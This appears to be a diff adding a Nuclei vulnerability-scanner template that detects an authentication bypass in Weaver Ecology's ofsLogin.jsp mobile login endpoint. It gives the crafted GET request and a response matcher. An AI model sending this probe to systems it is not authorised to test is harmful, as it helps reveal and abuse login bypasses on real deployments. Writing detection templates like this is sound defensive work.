@@ -1,0 +1,21 @@
+id: ecology-ofslogin-aul
+info:
+  name: 泛微 Ecology ofslogin 接口 - 认证绕过漏洞
+  author: Chaitin
+  severity: high
+  reference:
+  - https://stack.chaitin.com/techblog/detail?id=90
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: weaver
+    product: ecology
+  tags: auth-bypass,vuln,weaver,ecology
+http:
+- method: GET
+  path:
+  - '{{BaseURL}}/mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird='
+  matchers:
+  - type: dsl
+    dsl:
+    - 'contains(body, "/login/Login.jsp") && contains(body, "location.replace") && status_code == 200'
